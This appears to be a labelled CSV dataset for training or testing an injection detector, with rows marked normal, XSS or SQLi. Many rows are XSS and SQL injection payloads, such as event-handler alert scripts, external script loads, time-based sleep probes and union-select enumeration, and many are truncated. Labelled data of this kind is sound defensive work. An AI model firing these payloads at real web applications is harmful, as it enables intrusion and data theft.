Payload,Label,text_label,ID
"Kohl's: 3-Day Sale: Save on select bed & bath, kit",0,normal,25918
or sleep 5--,2,SQLi,11166
1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ,2,SQLi,21655
"1"" ) as ltoa where 9159 = 9159 or exp ( ~ ( select",2,SQLi,19503
"-8005"" ) union all select 5213,5213,5213,5213,5213",2,SQLi,20912
<listing id=x tabindex=1 onfocusin=alert(1)></list,1,XSS,5255
"<script a="">"" SRC=""http://www.securitycompass.com/",1,XSS,1555
Order a refreshing drink.,0,normal,22689
Tick the box in the top toolbar to select all of t,0,normal,25287
"<tfoot onmouseenter=""alert(1)"">test</tfoot>",1,XSS,3369
1%' ) ) or ( select * from ( select ( sleep ( 5 ) ,2,SQLi,14684
He selected a font for the website design.,0,normal,23888
"<figure onmousemove=""alert(1)"">test</figure>",1,XSS,8393
1 SELECT pg_sleep(5);,2,SQLi,11330
"-6085 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( ",2,SQLi,22410
1%' ) ) ) ( select ( case when ( 5451 = 5451 ) the,2,SQLi,16165
I think you can select the pieces that serve you w,0,normal,26065
"<cite onbeforecopy=""alert(1)"" contenteditable>test",1,XSS,7093
Amazon slashed prices on select items at Whole Foo,0,normal,26375
1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ),2,SQLi,22029
"1%"" ) union all select null,null,null,null--",2,SQLi,14149
<div style=content:url(test2.svg)></div>,1,XSS,9165
<mark onfocusout=alert(1) tabindex=1 id=x></mark><,1,XSS,8900
Fetch records where valid.,0,normal,23271
"-2211"" or 2113 = 8885#",2,SQLi,21741
"-1083' ) union all select 9993,9993,9993,9993,9993",2,SQLi,12694
"1%"" ) ) ) or sleep ( 5 ) #",2,SQLi,20710
"<td oncut=""alert(1)"" contenteditable>test</td>",1,XSS,3313
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10758
1'+ ( select 'ycsv' where 3628 = 3628 and char ( 1,2,SQLi,14658
1' ) ) and exp ( ~ ( select * from ( select concat,2,SQLi,21439
"<br oncut=""alert(1)"" contenteditable>test</br>",1,XSS,2994
-4617' ) ) ) or 9323 = 9323#,2,SQLi,17136
1' ) and 6414 = ( select count ( * ) from rdb$fiel,2,SQLi,13808
<fieldset id=x tabindex=1 onfocus=alert(1)></field,1,XSS,8673
"-3729' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( c",2,SQLi,13399
-4828'+ ( select qxnw where 9488 = 9488 union all ,2,SQLi,18046
"<header onbeforecut=""alert(1)"" contenteditable>tes",1,XSS,4905
<head onpointerenter=alert(1)>XSS</head>,1,XSS,7162
"<style>@keyframes x{}</style><var style=""animation",1,XSS,4543
<caption onpointermove=alert(1)>XSS</caption>,1,XSS,7472
<script>window.onload=function(){document.forms[0],1,XSS,9002
"<style>@keyframes slidein {}</style><svg style=""an",1,XSS,8321
-7984' order by 1--,2,SQLi,20212
""",NULL)%20waitfor%20delay%20'0:0:20'%20/*",2,SQLi,10858
"<applet onbeforecut=""alert(1)"" contenteditable>tes",1,XSS,3758
"<meta charset=""UTF-7"" /> +ADw-script+AD4-alert(1)+",1,XSS,177
<sub id=x tabindex=1 onfocus=alert(1)></sub>,1,XSS,4981
1' ) ) or 2633 = dbms_pipe.receive_message ( chr (,2,SQLi,21726
"<pre onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,6666
Song to Song will be in select theaters starting M,0,normal,25529
Select a topic for the presentation.,0,normal,24180
-7293' ) ) ) or 3038 = 3038,2,SQLi,13604
"1"" or elt ( 6272 = 6272,sleep ( 5 ) )",2,SQLi,12318
Calculate sums where valid.,0,normal,23309
<table onpointermove=alert(1)>XSS</table>,1,XSS,8907
<legend onpointerout=alert(1)>XSS</legend>,1,XSS,8147
"Burton â 20 percent off select backpacks, through ",0,normal,26315
"<form><button formaction=""javascript:alert(1)"">//I",1,XSS,9847
"1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'fvtf' l",2,SQLi,17978
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfo",2,SQLi,10914
I need to decide where to go for the weekend.,0,normal,23686
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ,2,SQLi,17594
-1890' ) ) ) or 8526 = 1389 and ( ( ( 'ecgt' = 'ec,2,SQLi,12653
"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ",2,SQLi,13191
lower,0,normal,23191
"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105",2,SQLi,20351
-1606'|| ( select 'qbaa' where 3967 = 3967 union a,2,SQLi,20692
"<!--<img src=""--><img src=x onerror=alert(XSS)//"">",1,XSS,959
"1%"" ) ) ) or 7552 = ( select count ( * ) from rdb$",2,SQLi,21668
"<u onkeypress=""alert(1)"" contenteditable>test</u>",1,XSS,4939
"1"" ) as pgza where 8756 = 8756 or 9643 = ( select ",2,SQLi,16484
"1"" ) where 9656 = 9656 and sleep ( 5 ) --",2,SQLi,21597
"-1868 ) ) union all select 1859,1859--",2,SQLi,16256
1' ) where 4683 = 4683 and 3824 = benchmark ( 5000,2,SQLi,17660
1 ) as jmib where 8130 = 8130 rlike ( select ( cas,2,SQLi,19453
I need to select the perfect outfit for the occasi,0,normal,23693
"1"" ) ) ) and 8407 = ( select count ( * ) from gene",2,SQLi,21586
"<base onmouseleave=""alert(1)"">test</base>",1,XSS,3122
"1"" ) as ztkr where 1532 = 1532",2,SQLi,12110
",NULL)%20waifor%20delay%20'0:0:20'%20/*",2,SQLi,10857
-3849 ) or 5580 = 3442--,2,SQLi,14511
"1"" ) as dfmm where 7563 = 7563 or 8421 = ( select ",2,SQLi,19141
"Currently, it's only available in select parts of ",0,normal,26258
1'+ ( select mfcd where 6757 = 6757 and 4386 = utl,2,SQLi,16251
1' rlike ( select ( case when ( 7689 = 7689 ) then,2,SQLi,22157
"<samp onbeforecopy=""alert(1)"" contenteditable>test",1,XSS,2302
1%' ) ) ) rlike sleep ( 5 ) #,2,SQLi,20701
"<cite onkeypress=""alert(1)"" contenteditable>test</",1,XSS,7979
1'+ ( select 'aphz' where 1933 = 1933 union all se,2,SQLi,13211
Where's the best place to capture natural beauty?,0,normal,23822
"<style>@keyframes x{}</style><content style=""anima",1,XSS,8265
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.locatio,1,XSS,1571
<IMG âââ><SCRIPT>alert(âXSSâ)</SCRIPT>â>,1,XSS,934
<html id=x tabindex=1 onactivate=alert(1)></html>,1,XSS,6255
"<body onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,4605
1 ) ) ) and ( select * from ( select ( sleep ( 5 ),2,SQLi,20003
"<listing ondblclick=""alert(1)"">test</listing>",1,XSS,7489
1 rlike ( select * from ( select ( sleep ( 5 ) ) ),2,SQLi,16076
"<IMG SRC=x onmessage=""alert(String.fromCharCode(88",1,XSS,1177
"<aside onmouseup=""alert(1)"">test</aside>",1,XSS,3881
1' where 8864 = 8864,2,SQLi,18025
Select the Right check box to slightly slant the f,0,normal,25583
-8963 ) where 8528 = 8528 or ( 2470 = 3271 ) *3271,2,SQLi,12708
Nordstrom: Enjoy up to 40% off select designer cle,0,normal,25865
"<noframes onmouseup=""alert(1)"">test</noframes>",1,XSS,8497
select * from users where id = 1.*1 union select 1,2,SQLi,11785
`'><script>\xE2\x80\x87javascript:alert(1)</script,1,XSS,577
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0,1,XSS,1399
"-1152%' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( ch",2,SQLi,19207
<style>:target {color: red;}</style><map id=x styl,1,XSS,2925
"-3933%"" ) ) or elt ( 8142 = 2978,2978 ) and ( ( ""%",2,SQLi,15698
1' ) and 5556 = ( select count ( * ) from all_user,2,SQLi,14087
"-6987' union all select 4721,4721--",2,SQLi,19685
"<body onLoad body onLoad=""javascript:javascript:al",1,XSS,382
1'+ ( select cxvy where 7421 = 7421,2,SQLi,16029
1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( s,2,SQLi,14787
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;""",1,XSS,1258
"<menuitem onkeydown=""alert(1)"" contenteditable>tes",1,XSS,5397
"<s onbeforecopy=""alert(1)"" contenteditable>test</s",1,XSS,8483
"Select quickly, please.",0,normal,24456
<style id=x tabindex=1 onactivate=alert(1)></style,1,XSS,1913
Aggregate data where valid.,0,normal,23316
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data",1,XSS,1605
;confirm('XSS')//1491b2as,1,XSS,9739
"<frameset draggable=""true"" ondragleave=""alert(1)"">",1,XSS,5177
select ( case when ( 3537 = 5218 ) then 3537 else ,2,SQLi,13523
"-9622' union all select 7208,7208,7208,7208#",2,SQLi,12510
Where did you discover that hidden treasure?,0,normal,23966
"insert into users(login, password, level) values( ",2,SQLi,10047
1' and 2716 = ( select count ( * ) from sysusers a,2,SQLi,18715
Select the best attraction.,0,normal,24350
Select the perfect wine.,0,normal,22736
"<big onkeydown=""alert(1)"" contenteditable>test</bi",1,XSS,4390
1' ) where 5680 = 5680 and ( 3020 = 3020 ) *6703--,2,SQLi,19309
1 ) and 9198 = 9198--,2,SQLi,16885
if ( 3392 = 4422 ) select 3392 else drop function ,2,SQLi,21294
"<form><input type=search onsearch=alert(1) value=""",1,XSS,97
admin' ) or '1' = '1'#,2,SQLi,11570
<x%0Aonxxx=1,1,XSS,9361
1%' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113,2,SQLi,18476
<style>:target {color: red;}</style><strong id=x s,1,XSS,2791
1'|| ( select 'dpje' where 2704 = 2704 or char ( 7,2,SQLi,19382
"iif ( 5571 = 4947,1,1/0 )",2,SQLi,16754
Where to apply filters?,0,normal,23382
"<form onmousemove=""alert(1)"">test</form>",1,XSS,2699
"1%"" ) ) ) or 6979 = like ( 'abcdefg',upper ( hex (",2,SQLi,16555
<svg><animate xlink:href=#xss attributeName=href v,1,XSS,151
"<strong onpaste=""alert(1)"" contenteditable>test</s",1,XSS,4944
<em onpointerdown=alert(1)>XSS</em>,1,XSS,4378
"select * from generate_series ( 8147,8147,case whe",2,SQLi,20661
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,12146
1' ) as taay where 7027 = 7027 and elt ( 4249 = 42,2,SQLi,13946
<dd id=x tabindex=1 ondeactivate=alert(1)></dd><in,1,XSS,3130
Select the ideal gift for a special occasion.,0,normal,24173
"-6948"" ) ) as ojjl where 1300 = 1300 or 6872 = 687",2,SQLi,15601
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10730
1' ) ) and 4595 = 4595#,2,SQLi,17845
"select * from users where id = 1 or 1#"", union sel",2,SQLi,11797
1'+ ( select thmg where 2546 = 2546 or 1022 = ( se,2,SQLi,21456
"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 1",2,SQLi,14932
select ( case when ( 9376 = 4521 ) then 1 else 937,2,SQLi,19677
"><h1><IFRAME SRC=javascript:alert('XSS');""></IFRAM",1,XSS,1243
<BODY ONLOAD=alert('hellox worldss')>,1,XSS,954
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NUL",2,SQLi,10990
1 ) ) as iihk where 5414 = 5414 and 7756 = dbms_ut,2,SQLi,20872
"&lt;&lt;SCRIPT&gt;alert(\""XSS\"");//&lt;&lt;/SCRIPT",1,XSS,1088
"<div id=d><x xmlns='""><iframe onload=alert(2)//'><",1,XSS,9162
"1"" ) and updatexml ( 3393,concat ( 0x2e,0x7171706a",2,SQLi,22409
Select the perfect wedding officiant.,0,normal,24410
Join the race.,0,normal,22829
"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a",2,SQLi,17831
"-7725%' ) ) union all select 4559,4559,4559,4559,4",2,SQLi,22340
"<input type=""image"" dynsrc=""javascript:document.vu",1,XSS,1525
<style>:target {color: red;}</style><template id=x,1,XSS,2489
"-4407"" ) where 2055 = 2055 or elt ( 9714 = 5040,50",2,SQLi,21722
"1"" ) as jiyl where 4893 = 4893 union all select nu",2,SQLi,18586
"<style>@keyframes x{}</style><data style=""animatio",1,XSS,8200
<style>:target {color: red;}</style><rtc id=x styl,1,XSS,4727
Where's the fitness center?,0,normal,23636
<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><in,1,XSS,4034
";alert(String.fromCharCode(88,83,83))//';alert(Str",1,XSS,9562
"-8773%' ) ) ) union all select 8941,8941,8941,8941",2,SQLi,18909
"1"" ) ) as drss where 2077 = 2077 and 7533 = 7533--",2,SQLi,16156
"<svg><use href=""data:image/svg+xml,&lt;svg id='x' ",1,XSS,165
"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a7",2,SQLi,12711
"<kbd onbeforepaste=""alert(1)"" contenteditable>test",1,XSS,4837
Merge the project files for presentation.,0,normal,22990
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></S",1,XSS,829
Where can I select a fragrance for the party?,0,normal,23892
<audio controls onprogress=alert(1)><source src=va,1,XSS,30
"1"" ) ) or sleep ( 5 ) and ( ( ""mtmb"" like ""mtmb",2,SQLi,21476
1' ( select ( case when ( 5451 = 5451 ) then regex,2,SQLi,16276
select,0,normal,26596
"""We are writing to officially invoke our right to ",0,normal,26448
1' ) as uqkz where 8482 = 8482 and 8407 = ( select,2,SQLi,15070
"1%"" ) or ( select 9173 from ( select count ( * ) ,",2,SQLi,18273
<script\x0A>javascript:alert(1)</script>,1,XSS,605
"<style>.XSS{background-image:url(""javascript:docum",1,XSS,1512
"1"" where 3368 = 3368 and 9254 = ( select count ( *",2,SQLi,19279
1%' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 ,2,SQLi,14414
Select a fragrance for the perfume.,0,normal,24068
"1%"" or 9643 = ( select count ( * ) from domain.dom",2,SQLi,12437
"1 ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",2,SQLi,21519
<audio onpointerenter=alert(1)>XSS</audio>,1,XSS,8399
"1' and 3202 = like ( 'abcdefg',upper ( hex ( rando",2,SQLi,21287
"On the principle that as a rule like begets like, ",0,normal,25838
<button onMediaComplete=javascript:alert(1)>,1,XSS,9628
"&apos, OR",2,SQLi,11606
"1%' ) ) and elt ( 4483 = 5364,5364 ) and ( ( '%' =",2,SQLi,20144
"<form><button formaction=""javascript:alert(1)"">",1,XSS,9175
"<content onbeforepaste=""alert(1)"" contenteditable>",1,XSS,5067
<kbd onpointerover=alert(1)>XSS</kbd>,1,XSS,8661
"<meta onclick=""alert(1)"">test</meta>",1,XSS,2201
"{""id"":null,""firstName"":""ÃÂ§ÃÂ½Ã¢â¬Â°ÃÂ¥Ã¢â¬Â¦ÃÂ°"",""lastName""",0,normal,27587
Sort the scattered papers.,0,normal,22712
1 ) ) as bwrg where 3254 = 3254 union all select n,2,SQLi,13260
"<command draggable=""true"" ondrag=""alert(1)"">test</",1,XSS,8837
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3480
<acronym onpointerdown=alert(1)>XSS</acronym>,1,XSS,4709
"<mark onmouseout=""alert(1)"">test</mark>",1,XSS,8843
"<nextid draggable=""true"" ondragenter=""alert(1)"">te",1,XSS,6680
"1' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 'me",2,SQLi,20039
It would be impossible to refer here even briefly ,0,normal,25947
<script>alert('XSS')</script>,1,XSS,1706
"Select ""Uninstall,"" then choose ""Uninstall All"" to",0,normal,25667
"1%' union all select null,null#",2,SQLi,16327
"1"" ( select ( case when ( 5451 = 5451 ) then regex",2,SQLi,15922
"{""id"":null,""firstName"":""Wan"",""lastName"":""Jialing"",",0,normal,27148
<meta onpointerout=alert(1)>XSS</meta>,1,XSS,2438
"<address oncontextmenu=""alert(1)"">test</address>",1,XSS,3174
<iframe src=javascript:alert(1)>,1,XSS,9202
1'+ ( select 'rejz' where 1530 = 1530 and 7756 = d,2,SQLi,20995
1,0,normal,26656
"<img src\x10=x onerror=""javascript:alert(1)"">",1,XSS,665
"-6848"" ) ) or 4071 = 5312",2,SQLi,16641
"1"" ) where 4382 = 4382 and 6607 = 2394--",2,SQLi,21817
"-5231%"" or 4945 = 8402#",2,SQLi,21932
"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745",2,SQLi,16896
1%' ) ) ) and 8189 = ( select count ( * ) from sys,2,SQLi,19890
<svg><basefont onload=alert(1)></basefont>,1,XSS,6817
<style>:target {transform: rotate(180deg);}</style,1,XSS,2360
Fetch information where needed.,0,normal,23246
"<noframes onmouseout=""alert(1)"">test</noframes>",1,XSS,7789
"""`><script>/* *\x2Fjavascript:alert(1)// */</scrip",1,XSS,416
"perl -e &#039;print \"";<;IMG SRC=java\0script:aler",1,XSS,1686
1 ) where 1402 = 1402,2,SQLi,12372
<svg id=alert(1) onload=eval(id)>,1,XSS,9696
"1%"" ) ) ) rlike ( select ( case when ( 4442 = 4476",2,SQLi,21849
1 ) ) and 7533 = 7533 and ( ( 8738 = 8738,2,SQLi,14959
1 ) as ywrn where 1893 = 1893,2,SQLi,18302
"-9672%"" ) ) ) order by 1#",2,SQLi,19223
Select the ideal candidate.,0,normal,24294
Select a cozy blanket.,0,normal,22669
"<ul onbeforepaste=""alert(1)"" contenteditable>test<",1,XSS,5382
<math>,1,XSS,9232
-6222 ) ) or 4493 = utl_inaddr.get_host_address ( ,2,SQLi,12490
"iif ( 1149 = 4765,1,1/0 )",2,SQLi,19786
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10578
"Choose Update & Security and on the next screen, s",0,normal,26286
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>,1,XSS,1693
1' ) ) as njop where 7001 = 7001,2,SQLi,13026
<th id=x tabindex=1 onfocusin=alert(1)></th>,1,XSS,7366
Where's the stadium?,0,normal,23538
"-8636"" ) ) ) union all select 1821,1821,1821,1821,",2,SQLi,12460
<wbr onpointerout=alert(1)>XSS</wbr>,1,XSS,7537
<legend onpointerenter=alert(1)>XSS</legend>,1,XSS,8614
<option id=x tabindex=1 onactivate=alert(1)></opti,1,XSS,7032
-5211 union all select 1754--,2,SQLi,15835
"-6440 ) ) ) union all select 3316,3316,3316,3316,3",2,SQLi,18706
-9698' ) ) as qnjv where 3360 = 3360 or make_set (,2,SQLi,14992
"-6041' ) ) or make_set ( 9835 = 1367,1367 ) and ( ",2,SQLi,17262
) or ('x'='x,2,SQLi,10020
<style>:target {color: red;}</style><fieldset id=x,1,XSS,2869
<title onpointerup=alert(1)>XSS</title>,1,XSS,2028
"{""id"":null,""firstName"":""Lalyn"",""lastName"":""Astorga",0,normal,27105
1'|| ( select 'wcad' from dual where 4262 = 4262 a,2,SQLi,19692
"<IMG SRC=x onmousemove=""alert(String.fromCharCode(",1,XSS,1201
<head onpointermove=alert(1)>XSS</head>,1,XSS,3797
Where's the yoga class?,0,normal,23655
"{""id"":null,""firstName"":""Susan"",""lastName"":""Loh"",""s",0,normal,26808
-2402 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ),2,SQLi,14922
Select start.,0,normal,24583
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,16831
<colgroup id=x tabindex=1 onbeforeactivate=alert(1,1,XSS,8446
Delete posts.,0,normal,23035
1' ) as wtev where 5283 = 5283,2,SQLi,20842
"1"" ) ) ) or ( select 2* ( if ( ( select * from ( s",2,SQLi,16011
-5615' ) where 5931 = 5931 or 8450 = 9229,2,SQLi,21508
"<style>@keyframes slidein {}</style><hr style=""ani",1,XSS,4523
"<style>@keyframes x{}</style><rt style=""animation-",1,XSS,4702
1' ) and 3707 = ( select count ( * ) from sysibm.s,2,SQLi,16981
1' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ,2,SQLi,13408
"<script src=""\\example.com\foo.js""></script> // Sa",1,XSS,9254
"1' or row ( 1045,7562 ) > ( select count ( * ) ,co",2,SQLi,12875
1'|| ( select 'yyil' from dual where 3121 = 3121,2,SQLi,20149
"iif ( 4638 = 8258,1,1/0 )",2,SQLi,15275
Mr. Miakhel said the Taliban were demanding that t,0,normal,25875
Where's the nearest gas station?,0,normal,23491
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,13228
"<style>@keyframes x{}</style><ruby style=""animatio",1,XSS,2092
"<noframes oncontextmenu=""alert(1)"">test</noframes>",1,XSS,5233
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10471
Select your challenge.,0,normal,24919
"-7329"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5",2,SQLi,15031
Ã¢â¬Ë or 1 = 1 --,2,SQLi,11629
Select the perfect font for the design.,0,normal,24184
"1' ) ) ) or row ( 1045,7562 ) > ( select count ( *",2,SQLi,20900
"-6996%"" or 1 group by concat ( 0x7171706a71, ( sel",2,SQLi,21765
"1%' union all select null,null,null,null,null--",2,SQLi,14769
"<progress onbeforepaste=""alert(1)"" contenteditable",1,XSS,4049
1 ) and ( select * from ( select ( sleep ( 5 ) ) ),2,SQLi,12356
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/S",1,XSS,1582
1' ) ) as qcgf where 9656 = 9656 or 5356 = ( selec,2,SQLi,20445
"In 1845 he was appointed select preacher, and publ",0,normal,26022
1' and 3707 = ( select count ( * ) from sysibm.sys,2,SQLi,20897
"If not, you can select from a great array of dildo",0,normal,26055
Plant some vibrant flowers.,0,normal,22694
",NULL)%20waitfor%20delay%20'0:0:20'%20--",2,SQLi,10856
"-6017 union all select 8449,8449,8449--",2,SQLi,22290
Where's the WHERE clause?,0,normal,23464
1' ) ) as mbzk where 9153 = 9153 and 2006 = 2006,2,SQLi,12704
<select autofocus onfocusin=alert(1)>,1,XSS,2720
I need to select the right tools for the job.,0,normal,23741
"{""id"":null,""firstName"":""Susie"",""lastName"":""Tijo"",""",0,normal,27174
"<script>$(""span.foo"").click(function() {alert('foo",1,XSS,9275
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71",2,SQLi,19324
Select bargain.,0,normal,24766
"<rp onbeforecut=""alert(1)"" contenteditable>test</r",1,XSS,3604
"document.getElementsByName("""")",1,XSS,3419
"1%"" ) and ( select * from ( select ( sleep ( 5 ) )",2,SQLi,15878
He deleted the old posts.,0,normal,23003
"<frame onmouseenter=""alert(1)"">test</frame>",1,XSS,5519
select ( case when ( 4205 = 9574 ) then 4205 else ,2,SQLi,15140
1' ) and 2006 = 2006,2,SQLi,19589
"1"" where 2072 = 2072 or 7427 = dbms_pipe.receive_m",2,SQLi,20764
1' where 7191 = 7191 rlike sleep ( 5 ) --,2,SQLi,12282
"1"" ) ) and 4241 = convert ( int, ( select char ( 1",2,SQLi,12483
1 where 7299 = 7299 rlike sleep ( 5 ) --,2,SQLi,16473
"1' ) ) ) union all select null,null,null,null,null",2,SQLi,22113
"ABC<div style=""x:\x0Bexpression(javascript:alert(1",1,XSS,485
<script>Function`X${document.location.hash.substr`,1,XSS,135
"<colgroup oncopy=""alert(1)"" contenteditable>test</",1,XSS,2361
"<style>@keyframes slidein {}</style><td style=""ani",1,XSS,7947
<set onpointerenter=alert(1)>XSS</set>,1,XSS,4185
"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) a",2,SQLi,18561
Beginning with not too many stocks he can test the,0,normal,26327
"1 union all select null,null#",2,SQLi,12290
-8876' ) ) or 3038 = 3038,2,SQLi,21892
1 ) ) ) rlike ( select ( case when ( 4367 = 6879 ),2,SQLi,12861
"<img src=x\x13onerror=""javascript:alert(1)"">",1,XSS,676
1%' and 8594 = ( select 8594 from pg_sleep ( 5 ) ),2,SQLi,17671
